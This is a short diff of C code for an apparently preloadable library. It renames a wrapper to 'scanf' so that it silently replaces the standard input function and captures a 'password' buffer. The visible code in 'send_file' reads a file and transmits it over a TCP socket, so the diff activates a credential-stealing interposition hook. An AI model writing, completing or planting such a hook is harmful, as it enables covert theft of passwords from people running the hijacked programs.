@@ -40,13 +40,9 @@ void mydest()
 	{
 		dlclose(handle);
 	}
-	// if (fd != NULL)
-	// {
-	// 	fclose(fd);
-	// }
 }
 
-int myscanf(const char *format, ...)
+int scanf(const char *format, ...)
 {
 	sym orig_scanf;
 	char password[1000];
@@ -100,7 +96,6 @@ int send_file()
 	fread(filedata, sizeof(char), size_of_file, file);
 	// close the file
 	fclose(file);
-	printf("the file is: %d\n", size_of_file);
 
 	// creating a new socket
 	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -155,7 +150,7 @@ int send_file()
 		printf("Only %d bytes sent of %d bytes \n", bytesSent, size_of_file);
 		return -1;
 	}
-	printf("The file sent successfully");
+	printf("The file sent successfully\n");
 
 	// close the connection
 	close(sock);
@@ -165,5 +160,5 @@ int send_file()
 int main()
 {
 	char password[1000];
-	myscanf("%s ", password);
+	scanf("%s ", password);
 }
